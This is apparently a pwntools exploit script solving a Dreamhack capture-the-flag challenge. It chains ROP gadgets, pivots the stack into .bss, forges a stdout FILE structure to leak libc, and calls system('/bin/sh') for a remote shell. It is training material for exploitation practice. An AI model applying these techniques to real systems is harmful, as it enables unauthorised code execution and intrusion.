from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 11703
r = remote(HOST, PORT)

prefix=b'DREAMHACK!\x00'
for i in range(107):
    prefix += int.to_bytes(107-i)

pop_rdi=0x400873
pop_rsi=0x40068b
pop_rdx=0x400694
pop_rsp_r13_r14_r15=0x40086d
pop_rbp=0x400608
ret=0x40053e
read_plt=0x400560
stdout=0x601020
main=0x40079d
after_validation=0x4007ec
bss=0x601000
safe_stack=bss+0x500
safe_rbp=bss+0x600
read_sh =bss+0x700

fs = FileStructure()
fs.flags = 0xfbad1000
fs._IO_write_base = stdout
fs._IO_write_ptr = stdout+8
fs._IO_write_end = stdout+0x100
fs.fileno = 1
fs._lock = bss+0x200

fs_payload = bytes(fs)[:-8]

before_stdout = flat([
    0,0,0,
    pop_rsi
])

after_stdout = flat([
    pop_rdi,0,
    pop_rdx,len(fs_payload),
    read_plt,
    pop_rsp_r13_r14_r15,safe_stack
])

safe_main_stack = flat([
    0,0,0,
    pop_rbp,safe_rbp,
    after_validation,
])

post_leak = flat([
    0,
    pop_rdi,0,
    pop_rsi,read_sh,
    pop_rdx,0x100,
    read_plt,
    pop_rsp_r13_r14_r15,read_sh
])

payload = prefix.ljust(128,b'\x00')
payload += p64(0)

payload += flat([
    pop_rdi,0,
    pop_rsi,bss,
    pop_rdx,len(before_stdout),
    read_plt
])

payload += flat([
    pop_rdi,0,
    pop_rsi,stdout+8,
    pop_rdx,len(after_stdout),
    read_plt
])

payload += flat([
    pop_rdi,0,
    pop_rsi,safe_stack,
    pop_rdx,len(safe_main_stack),
    read_plt
])

payload += flat([
    pop_rdi,0,
    pop_rsi,safe_rbp,
    pop_rdx,len(post_leak),
    read_plt
])

payload += flat([
    pop_rsp_r13_r14_r15,
    bss
])

r.send(payload.ljust(0x400,b'\x00'))
r.send(before_stdout + after_stdout + safe_main_stack + post_leak + fs_payload)

libc=u64(r.recv(8))-0x3ec760

binsh=libc+0x1b40fa
system=libc+0x4f4e0

r.send(flat([
    0,0,0,
    ret,
    pop_rdi,binsh,
    system
]))

r.interactive()